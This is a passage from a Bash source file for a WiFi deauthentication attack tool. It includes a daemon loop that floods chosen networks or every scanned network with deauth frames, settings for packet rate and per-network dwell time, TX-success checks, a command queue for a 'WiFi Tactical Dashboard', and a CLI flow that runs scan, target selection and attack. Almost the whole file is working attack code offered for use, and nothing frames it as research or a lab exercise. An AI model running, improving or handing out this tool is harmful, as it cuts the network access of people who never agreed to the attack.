    DAEMON_ATTACK_REMAINING=$ATTACK_DWELL_TICKS
    DEAUTH_FAIL_STREAK=0

    if start_deauth_on_target "$bssid" "$channel" "$target_pkts"; then
        sleep 0.35
        verify_packet_tx "$target_pkts" && DAEMON_TX_OK=1 || DAEMON_TX_OK=0
    else
        DAEMON_TX_OK=0
    fi

    if (( DAEMON_TX_OK )); then
        DAEMON_TX_MSG="TX OK — deauth on $essid (${DEAUTH_CLIENT_COUNT} clients, ${DEAUTH_PPS} pps)"
    else
        DAEMON_TX_MSG="TX FAIL — deauth NOT sending on $essid!"
        daemon_log "TX FAIL on #$DAEMON_ATTACK_IDX $essid (channel $channel)"
    fi
    write_tx_status "$DAEMON_ATTACK_IDX" "$essid" "$DAEMON_TX_OK" "$DAEMON_TX_MSG"
    play_attack_burst
}

daemon_attack_tick() {
    local contacts_file essid bssid channel target_key target_pkts status_msg switch_target=0 alive=0

    (( DAEMON_ATTACK_ACTIVE )) || return 0

    contacts_file="${DAEMON_STATE_DIR}/session/radar_attack_contacts.txt"
    DAEMON_PACKET_PHASE=$(( (DAEMON_PACKET_PHASE + ATTACK_PACKET_RATE) % 100 ))
    DAEMON_FRAME=$((DAEMON_FRAME + 1))

    if [[ "${DAEMON_ATTACK_MODE:-}" == "all" || "${DAEMON_ATTACK_MODE:-}" == "multi" ]]; then
        bssid="${NET_BSSID[$DAEMON_ATTACK_IDX]}"
        channel="${NET_CHANNEL[$DAEMON_ATTACK_IDX]}"
        essid="${NET_ESSID[$DAEMON_ATTACK_IDX]}"
        target_pkts=$(effective_attack_packets "$DAEMON_ATTACK_IDX" "${DAEMON_ATTACK_MODE:-}")

        deauth_any_alive && alive=1
        if (( ! alive )); then
            start_deauth_on_target "$bssid" "$channel" "$target_pkts" || true
        fi

        verify_packet_tx "$target_pkts" && DAEMON_TX_OK=1 || DAEMON_TX_OK=0
        if (( DAEMON_TX_OK )); then
            if [[ "${DAEMON_ATTACK_MODE:-}" == "all" ]] && (( SHIFT_PACKETS > 0 )); then
                DAEMON_TX_MSG="TX OK — $essid (${SHIFT_PACKETS} pkt shift rule, ${DEAUTH_CLIENT_COUNT} clients)"
                status_msg="TX OK >>> $essid (${SHIFT_PACKETS} pkts) [${ATTACK_SPEED}]"
            else
                DAEMON_TX_MSG="TX OK — $essid (${target_pkts:-∞} pkts, ${DEAUTH_CLIENT_COUNT} clients, ${DEAUTH_MODE})"
                status_msg="TX OK >>> $essid (${DEAUTH_CLIENT_COUNT} clients) [${ATTACK_SPEED}]"
            fi
        else
            DAEMON_TX_MSG="TX FAIL — packets NOT connecting to $essid!"
            status_msg="TX FAIL >>> $essid — NOT CONNECTING! [${ATTACK_SPEED}]"
        fi
        write_tx_status "$DAEMON_ATTACK_IDX" "$essid" "$DAEMON_TX_OK" "$DAEMON_TX_MSG"

        if (( target_pkts > 0 )); then
            tx_sent=$(( $(get_mon_tx_packets) - DEAUTH_TX_BASELINE ))
            (( tx_sent < 0 )) && tx_sent=0
            if (( ! alive )); then
                if (( tx_sent > 0 )) || (( DEAUTH_FAIL_STREAK >= 2 )); then
                    switch_target=1
                fi
            fi
        else
            DAEMON_ATTACK_REMAINING=$((DAEMON_ATTACK_REMAINING - 1))
            if (( DAEMON_ATTACK_REMAINING <= 0 )); then
                switch_target=1
            fi
        fi

        if [[ "${DAEMON_ATTACK_MODE:-}" == "multi" ]]; then
            target_key=$(IFS=,; echo "${DAEMON_ATTACK_TARGETS[*]}")
        else
            target_key="${DAEMON_ATTACK_IDX}"
        fi

        export_contacts_from_arrays "$contacts_file" "$target_key"
        radar_write_state "attack" "$DAEMON_ATTACK_REMAINING" "$ATTACK_DWELL_TICKS" \
            "$DAEMON_FRAME" "$contacts_file" "$status_msg" "$NET_COUNT" \
            "$DAEMON_ATTACK_IDX" "$essid" "$DAEMON_PACKET_PHASE"

        if (( switch_target )); then
            daemon_switch_attack_target
            essid="${NET_ESSID[$DAEMON_ATTACK_IDX]}"
            if (( DAEMON_TX_OK )); then
                status_msg="TX OK >>> $essid [${ATTACK_SPEED}]"
            else
                status_msg="TX FAIL >>> $essid — NOT CONNECTING!"
            fi
        fi
        daemon_write_status "attacking" "$status_msg"
    else
        bssid="${NET_BSSID[$TARGET_INDEX]}"
        channel="${NET_CHANNEL[$TARGET_INDEX]}"
        essid="${NET_ESSID[$TARGET_INDEX]:-$DAEMON_ATTACK_TARGET}"
        target_pkts="${NET_PACKETS[$TARGET_INDEX]:-$(default_packets_for_network)}"

        deauth_any_alive && alive=1
        if (( ! alive )); then
            start_deauth_on_target "$bssid" "$channel" "$target_pkts" || true
        fi

        verify_packet_tx "$target_pkts" && DAEMON_TX_OK=1 || DAEMON_TX_OK=0
        if (( DAEMON_TX_OK )); then
            DAEMON_TX_MSG="TX OK — packets connecting to $essid (${target_pkts:-∞} pkts, ${DEAUTH_CLIENT_COUNT} clients)"
            status_msg="LIVE TX OK >>> $essid (${DEAUTH_CLIENT_COUNT} clients) [${ATTACK_SPEED}]"
        else
            DAEMON_TX_MSG="TX FAIL — packets NOT connecting to $essid!"
            status_msg="LIVE TX FAIL >>> $essid — NOT CONNECTING! [${ATTACK_SPEED}]"
            if (( DEAUTH_FAIL_STREAK >= 3 )) && (( ! alive )); then
                start_deauth_on_target "$bssid" "$channel" "$target_pkts" || true
                DEAUTH_FAIL_STREAK=0
            fi
        fi
        write_tx_status "$TARGET_INDEX" "$essid" "$DAEMON_TX_OK" "$DAEMON_TX_MSG"

        export_contacts_from_arrays "$contacts_file" "$TARGET_INDEX"
        radar_write_state "attack" 0 0 "$DAEMON_FRAME" "$contacts_file" \
            "$status_msg" "$NET_COUNT" "$TARGET_INDEX" "$essid" "$DAEMON_PACKET_PHASE"
        daemon_write_status "attacking" "$status_msg"
    fi
}

daemon_cmd_attack_stop() {
    DAEMON_ATTACK_ACTIVE=0
    DAEMON_ATTACK_MODE=""
    DAEMON_ATTACK_TARGET=""
    DAEMON_ATTACK_REMAINING=0
    DAEMON_LIVE_ATTACK=0
    stop_deauth_attack
    if [[ -n "${RADAR_DIR:-}" && -d "$RADAR_DIR" ]]; then
        echo idle >"${RADAR_DIR}/mode"
        echo "ATTACK STOPPED" >"${RADAR_DIR}/status"
        echo 0 >"${RADAR_DIR}/packet_phase"
        echo "" >"${RADAR_DIR}/target_essid"
    fi
    DAEMON_LIVE_ACTIVE=1
    daemon_live_watch_start || true
    daemon_write_status "ready" "Attack stopped — live watch resumed"
    daemon_write_result "OK"
    daemon_log "Attack stopped by dashboard"
}

daemon_cmd_cleanup() {
    local force="${1:-0}"

    if (( force == 0 )) && (( DAEMON_SCAN_REMAINING > 0 || DAEMON_ATTACK_ACTIVE )); then
        daemon_log "Cleanup skipped — operation in progress (scan=${DAEMON_SCAN_REMAINING:-0})"
        daemon_write_result "BUSY"
        return 1
    fi

    set +e
    stop_background_jobs
    if (( force )); then
        restore_managed_mode
        if [[ "${NM_WAS_ACTIVE:-0}" -eq 1 || "${WPA_WAS_ACTIVE:-0}" -eq 1 ]]; then
            restore_network_services
        fi
        MONITOR_ENABLED=0
        MON_IFACE=""
        safe_write "${DAEMON_STATE_DIR}/mon_iface" ""
    fi
    if [[ -n "${RADAR_DIR:-}" && -f "${RADAR_DIR}/active" ]]; then
        echo 0 >"${RADAR_DIR}/active"
    fi
    DAEMON_ATTACK_ACTIVE=0
    DAEMON_SCAN_REMAINING=0
    set -e
    if (( force )); then
        daemon_write_status "idle" "System restored"
    fi
    daemon_write_result "OK"
    return 0
}

daemon_on_signal() {
    DAEMON_SHUTDOWN=1
    daemon_cmd_cleanup 1
    exit 0
}

daemon_on_exit() {
    if (( DAEMON_SHUTDOWN )); then
        return 0
    fi
    daemon_log "Daemon exited unexpectedly (scan=${DAEMON_SCAN_REMAINING:-0} attack=${DAEMON_ATTACK_ACTIVE:-0})"
}

daemon_cmd_set_shift_packets() {
    local val="${1//[[:space:]]/}"

    if [[ "$val" =~ ^[0-9]+$ ]] && (( val >= 0 && val <= 1000000 )); then
        SHIFT_PACKETS=$val
        if (( SHIFT_PACKETS > 0 )); then
            daemon_write_status "${DAEMON_PHASE:-ready}" \
                "Attack ALL packet rule: ${SHIFT_PACKETS} pkts then shift"
        else
            daemon_write_status "${DAEMON_PHASE:-ready}" \
                "Attack ALL packet rule off — using time shift"
        fi
        daemon_write_result "OK"
        daemon_log "Shift packets set to ${SHIFT_PACKETS}"
    else
        daemon_write_result "ERROR"
    fi
}

daemon_cmd_set_shift_dwell() {
    local val="${1//[[:space:]]/}"

    if awk -v s="$val" 'BEGIN { exit (s >= 0.1 && s <= 120) ? 0 : 1 }'; then
        SHIFT_DWELL_SEC=$val
        daemon_write_status "${DAEMON_PHASE:-ready}" "Attack ALL shift: ${SHIFT_DWELL_SEC}s per network"
        daemon_write_result "OK"
        daemon_log "Shift dwell set to ${SHIFT_DWELL_SEC}s"
    else
        daemon_write_result "ERROR"
    fi
}

daemon_cmd_set_sensitivity() {
    case "${1,,}" in
        normal|high|max)
            SIGNAL_SENSITIVITY="${1,,}"
            daemon_write_status "${DAEMON_PHASE:-ready}" "Signal sensitivity: ${SIGNAL_SENSITIVITY}"
            daemon_write_result "OK"
            daemon_log "Sensitivity set to ${SIGNAL_SENSITIVITY}"
            ;;
        *)
            daemon_write_result "ERROR"
            ;;
    esac
}

daemon_handle_cmd() {
    local cmd="$1"
    local action args

    read -r action args <<< "$cmd"

    case "$action" in
        PING)
            daemon_write_result "OK"
            ;;
        LIST_IFACES)   daemon_list_ifaces_json ;;
        ENABLE_MONITOR) daemon_cmd_enable_monitor "$args" ;;
        SCAN_START)    daemon_cmd_scan_start "$args" ;;
        SCAN_STOP)     daemon_cmd_scan_stop ;;
        ATTACK_START)
            local amode aidx=""
            read -r amode aidx <<< "$args"
            daemon_cmd_attack_start "$amode" "${aidx:-1}"
            ;;
        SET_SPEED)
            ATTACK_SPEED="${args:-high}"
            apply_attack_speed
            daemon_write_status "${DAEMON_PHASE:-ready}" "Attack speed: ${ATTACK_SPEED}"
            daemon_write_result "OK"
            ;;
        SET_NETWORK_PACKETS)
            daemon_cmd_set_network_packets "$args"
            ;;
        SET_SHIFT_DWELL)
            daemon_cmd_set_shift_dwell "$args"
            ;;
        SET_SHIFT_PACKETS)
            daemon_cmd_set_shift_packets "$args"
            ;;
        SET_SENSITIVITY)
            daemon_cmd_set_sensitivity "$args"
            ;;
        ATTACK_STOP)   daemon_cmd_attack_stop ;;
        CLEANUP)
            if (( DAEMON_SCAN_REMAINING > 0 || DAEMON_ATTACK_ACTIVE )); then
                daemon_log "Ignored CLEANUP during active scan/attack"
                daemon_write_result "BUSY"
            else
                daemon_cmd_cleanup 1
            fi
            ;;
        SHUTDOWN)
            DAEMON_SHUTDOWN=1
            daemon_cmd_cleanup 1
            daemon_write_result "OK"
            exit 0
            ;;
        *)
            daemon_write_status "error" "Unknown command: $action" "bad_cmd"
            daemon_write_result "ERROR"
            ;;
    esac
}

daemon_process_commands() {
    local cmd_file cmd req_id count=0 max_batch=8

    shopt -s nullglob
    for cmd_file in "${DAEMON_STATE_DIR}/cmd_queue/"*.cmd; do
        [[ -f "$cmd_file" ]] || continue
        [[ "$(basename "$cmd_file")" == shutdown_* ]] && { rm -f "$cmd_file"; continue; }
        req_id=$(basename "$cmd_file" .cmd)
        cmd=$(<"$cmd_file")
        if [[ "$cmd" == CLEANUP* || "$cmd" == SHUTDOWN* ]]; then
            if (( DAEMON_SCAN_REMAINING > 0 || DAEMON_ATTACK_ACTIVE )); then
                rm -f "$cmd_file"
                daemon_log "Dropped stale $cmd during active operation"
                continue
            fi
        fi
        rm -f "$cmd_file"
        DAEMON_REQ_ID="$req_id"
        daemon_handle_cmd "$cmd"
        DAEMON_REQ_ID=""
        count=$((count + 1))
        (( count >= max_batch )) && break
    done
    shopt -u nullglob

    if [[ -f "${DAEMON_STATE_DIR}/cmd" ]]; then
        cmd=$(<"${DAEMON_STATE_DIR}/cmd")
        rm -f "${DAEMON_STATE_DIR}/cmd"
        DAEMON_REQ_ID=""
        daemon_handle_cmd "$cmd"
    fi
}

daemon_main() {
    DAEMON_STATE_DIR="$1"
    WIFI_DASHBOARD_MODE=1
    resolve_tool_dir
    mkdir -p "$DAEMON_STATE_DIR/cmd_queue" "$DAEMON_STATE_DIR/session" "$DAEMON_STATE_DIR/logs" 2>/dev/null || \
        die "Could not create daemon state directory."
    ensure_disk_space "$SESSION_DATA_DIR"
    daemon_cleanup_cmd_queue
    : >>"${DAEMON_STATE_DIR}/daemon.log"

    check_tools
    ensure_wifi_drivers 1
    apply_attack_speed
    daemon_write_status "idle" "Daemon ready"
    daemon_log "Daemon started (PID $$)"
    echo "$$" >"${DAEMON_STATE_DIR}/daemon.pid"

    trap daemon_on_signal INT TERM
    trap daemon_on_exit EXIT

    set +e
    set +u
    while (( ! DAEMON_SHUTDOWN )); do
        daemon_process_commands
        daemon_scan_tick
        daemon_live_watch_tick
        daemon_attack_tick
        if [[ ! -f "${DAEMON_STATE_DIR}/status.json" ]]; then
            daemon_write_status "idle" "Ready"
        fi
        sleep 0.1
    done
}

launch_dashboard() {
    local script_abs script_dir state_dir dashboard_py daemon_pid old_pid

    script_abs=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")
    script_dir=$(dirname "$script_abs")
    dashboard_py="${script_dir}/wifi_dashboard.py"
    state_dir=$(create_session_dir)

    [[ -f "$dashboard_py" ]] || die "Dashboard not found: $dashboard_py"

    check_tools

    export DISPLAY="${DISPLAY:-:0}"

    if [[ -f "${state_dir}/daemon.pid" ]]; then
        old_pid=$(<"${state_dir}/daemon.pid")
        if [[ -n "$old_pid" ]] && kill -0 "$old_pid" 2>/dev/null; then
            kill -9 "$old_pid" 2>/dev/null || true
            sleep 0.3
        fi
    fi
    daemon_cleanup_cmd_queue "$state_dir"
    safe_write "${state_dir}/status.json" \
        '{"phase":"starting","message":"Starting daemon...","mon_iface":"","scan_remaining":0,"scan_total":0}' || true

    info "Session data: ${state_dir}"
    bash "$script_abs" --daemon "$state_dir" >>"${state_dir}/boot.log" 2>&1 &
    daemon_pid=$!
    echo "$daemon_pid" >"${state_dir}/daemon.pid"
    sleep 0.6

    if ! kill -0 "$daemon_pid" 2>/dev/null; then
        die "Failed to start backend daemon. Check ${state_dir}/boot.log"
    fi

    info "Launching WiFi Tactical Dashboard..."
    set +e
    python3 "$dashboard_py" "$state_dir" "$daemon_pid"
    local dash_rc=$?
    set -e

    safe_write "${state_dir}/cmd_queue/shutdown_$$.cmd" "SHUTDOWN"$'\n' || \
        safe_write "${state_dir}/cmd" "SHUTDOWN"$'\n' || true
    sleep 2
    kill "$daemon_pid" 2>/dev/null || true
    wait "$daemon_pid" 2>/dev/null || true
    cleanup_session_data
    info "Session data cleared."

    exit "$dash_rc"
}

# ------------------------------------------------------------
# Main script flow (CLI mode)
# ------------------------------------------------------------
main() {
    check_root
    check_tools

    find_wireless_ifaces
    enable_monitor_mode "$SELECTED_IFACE"
    ask_duration
    run_scan "$MON_IFACE" "$SCAN_DURATION"
    parse_networks "$SCAN_CSV"
    select_targets
    show_disclaimer

    if [[ $TARGET_MODE == "single" ]]; then
        attack_single "${NET_BSSID[$TARGET_INDEX]}" "${NET_CHANNEL[$TARGET_INDEX]}"
    else
        attack_all
    fi
}

if [[ "${1:-}" == "--radar" && -n "${2:-}" ]]; then
    trap 'command -v tput >/dev/null 2>&1 && tput cnorm 2>/dev/null; stty echo 2>/dev/null; exit 0' EXIT INT TERM
    radar_display_loop "$2"
    exit 0
fi

if [[ "${1:-}" == "--daemon" && -n "${2:-}" ]]; then
    daemon_main "$2"
    exit 0
fi

if [[ "${1:-}" == "--cli" ]]; then
    shift
    trap 'on_error $LINENO' ERR
    trap 'cleanup $?' EXIT
    trap 'cleanup 130' INT
    trap 'cleanup 143' TERM
    main "$@"
    exit 0
fi

# Default: open Python dashboard
check_root
launch_dashboard
